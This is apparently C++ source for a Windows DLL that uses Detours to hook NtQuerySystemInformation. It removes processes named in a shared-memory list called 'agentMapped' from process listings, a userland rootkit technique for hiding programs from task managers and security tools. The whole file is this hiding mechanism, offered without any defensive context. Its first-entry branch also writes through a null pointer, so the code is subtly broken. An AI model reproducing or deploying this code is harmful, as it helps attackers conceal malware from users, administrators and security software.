#include <stdio.h>
#include <Windows.h>
#include <shlwapi.h>
#include "pch.h"
#include "detours.h"
#include <string>
#include <locale>
#include <codecvt>
#include <vector>
#include <Winternl.h>

using namespace std;



typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

NtQuerySystemInformation_t origNtQuerySystemInformation = NULL;

std::vector<wchar_t*> deserializeWCharTPointerVector(std::wstring fileName) {
    // Abrir el archivo mapeado
    HANDLE fileMapping = OpenFileMappingW(FILE_MAP_READ, FALSE, fileName.c_str());
    LPVOID mappedView = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);

    // Obtener los datos serializados
    std::wstring serializedData(static_cast<const wchar_t*>(mappedView));

    // Convertir std::wstring de nuevo a wchar_t*
    std::vector<wchar_t*> deserializedData;
    size_t pos = 0;
    wchar_t* token;
    while ((pos = serializedData.find(L',')) != std::wstring::npos) {
        token = new wchar_t[pos + 1];
        wcsncpy(token, serializedData.c_str(), pos);
        token[pos] = L'\0';
        deserializedData.push_back(token);
        serializedData.erase(0, pos + 1);
    }

    if (!serializedData.empty()) {
        token = new wchar_t[serializedData.size() + 1];
        wcsncpy(token, serializedData.c_str(), serializedData.size());
        token[serializedData.size()] = L'\0';
        deserializedData.push_back(token);
    }


    return deserializedData;
}


NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    OutputDebugStringW(L"sadas");
    vector<wchar_t*> agentVector = deserializeWCharTPointerVector(L"agentMapped");
    NTSTATUS status = origNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (SystemInformationClass == SystemProcessInformation) {
        PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pPrevious = NULL;

        while (true) {
            if (pCurrent->ImageName.Buffer != NULL) {
                // Utilizar std::find para buscar el nombre del proceso en el vector
                const auto it = std::find_if(agentVector.begin(), agentVector.end(),
                    [pCurrent](const wchar_t* nombreProceso) {
                        return wcsstr(pCurrent->ImageName.Buffer, nombreProceso) != NULL;
                    });

                // Verificar si se encontró el proceso en la lista
                if (it != agentVector.end()) {
                    
                    if (pPrevious == NULL) {
                        pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
                        if (pCurrent->NextEntryOffset != 0) {
                            memmove(pPrevious, pCurrent, (PCHAR)pCurrent - (PCHAR)pPrevious);
                            pCurrent = pPrevious;
                        }
                        else {
                            pPrevious->NextEntryOffset = 0;
                        }
                    }
                    else {
                        pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
                    }
                }
            }

            if (pCurrent->NextEntryOffset == 0) {
                break;
            }

            pPrevious = pCurrent;
            pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
        }
    }

    return status;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:{
        origNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
        DetourTransactionCommit();
        break;
    }
    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
        DetourTransactionCommit();
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}
